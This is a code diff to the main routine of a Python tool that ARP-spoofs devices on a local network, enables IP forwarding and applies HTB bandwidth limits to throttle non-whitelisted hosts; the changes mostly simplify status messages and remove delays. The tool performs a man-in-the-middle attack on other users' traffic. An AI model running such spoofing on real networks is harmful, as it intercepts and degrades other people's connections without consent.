@@ -152,7 +152,7 @@ def main():
             targets_to_throttle = [d for d in devices if d["ip"] not in safe_ips]
 
             if not targets_to_throttle:
-                print("  [!] No targets to throttle. Everyone is whitelisted.")
+                console.print(" [error]No targets to throttle. Everyone is whitelisted.[/error]")
                 sys.exit(0)
                 
         limit_mbps = pick_limit(prompt)
@@ -167,23 +167,13 @@ def main():
     success = False
 
     try:
-        with console.status("Initializing network routing...", spinner="dots") as status:
-            mode_display = operational_mode.capitalize() if operational_mode else "Blacklist"
-            status.update(f"Saving {mode_display} config for {len(targets_to_throttle)} target(s) to config.json...")
-        
-            save_config(interface, router_ip, operational_mode, targets_to_throttle, limit_mbps, status=status)
-            time.sleep(0.8)
+        with console.status("Starting session...", spinner="dots"):
+            save_config(interface, router_ip, operational_mode, targets_to_throttle, limit_mbps)
             
-            status.update("System: Forcing net.ipv4.ip_forward=1...")
             enable_ip_forward()
-            time.sleep(0.8)
             
-            status.update(f"QoS: Attaching {limit_mbps} Mbps HTB rules to interface {interface}...")
             setup_traffic_shaping(interface, targets_to_throttle, limit_mbps)
-                
-            time.sleep(0.8)
             
-            status.update(f"ARP: Injecting MITM routes between {len(targets_to_throttle)} target(s) and gateway {router_ip}...")
             for tgt in targets_to_throttle:
                 t = threading.Thread(
                     target=arp_spoof_loop,
@@ -192,15 +182,14 @@ def main():
                 )
                 t.start()
                 spoof_threads.append(t)
-            time.sleep(0.8)
             
-            success, captured_pkts = verify_spoofing(interface, stop_event, status=status)
+            success = verify_spoofing(interface, stop_event)
             
             if not success:
                 stop_event.set()
 
         if success:
-            console.print(f" [success]Spoofing successful! {captured_pkts} packets captured. Launching live monitor...[/success]")
+            console.print(" [success]Session started. Launching live monitor...[/success]")
             time.sleep(1.5)
             monitor_thread = threading.Thread(
                 target=live_monitor,
@@ -221,20 +210,13 @@ def main():
             monitor_thread.join(timeout=2)
 
     finally:
-        with console.status("Initiating teardown sequence...", spinner="dots") as status:
-
-            status.update(f"Teardown: Terminating active ARP spoofing threads for {len(spoof_threads)} thread(s)...")
+        with console.status("Stopping session...", spinner="dots"):
             for t in spoof_threads:
                 t.join(timeout=5)
-            time.sleep(0.6)
 
-            status.update(f"QoS: Flushing HTB shaping rules from interface {interface}...")
             cleanup_traffic_shaping(interface)
-            time.sleep(0.6)
 
-            status.update("System: Restoring net.ipv4.ip_forward=0...")
             disable_ip_forward()
-            time.sleep(0.6)
 
         console.print("\n [error]Session terminated.[/error]")
         console.print(" [success]Network restored and traffic shaping rules cleared.[/success]")
